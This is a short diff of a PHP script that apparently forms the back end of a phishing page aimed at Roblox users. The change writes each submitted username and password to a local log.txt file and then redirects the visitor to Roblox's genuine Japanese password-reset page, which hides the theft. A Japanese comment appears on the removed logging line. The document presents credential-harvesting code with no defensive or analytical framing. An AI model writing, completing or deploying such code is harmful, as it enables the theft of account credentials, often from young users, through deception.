@@ -5,8 +5,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     $log = "login: $u / pass: $p\n";
 
-    error_log($log); // ← これがターミナルに出力される！
+    file_put_contents("log.txt", $log, FILE_APPEND);
 
-    echo "https://www.roblox.com/ja/login/forgot-password-or-username";
+
+
+    header("Location: https://www.roblox.com/ja/login/forgot-password-or-username");
+    exit;
 }
 ?>
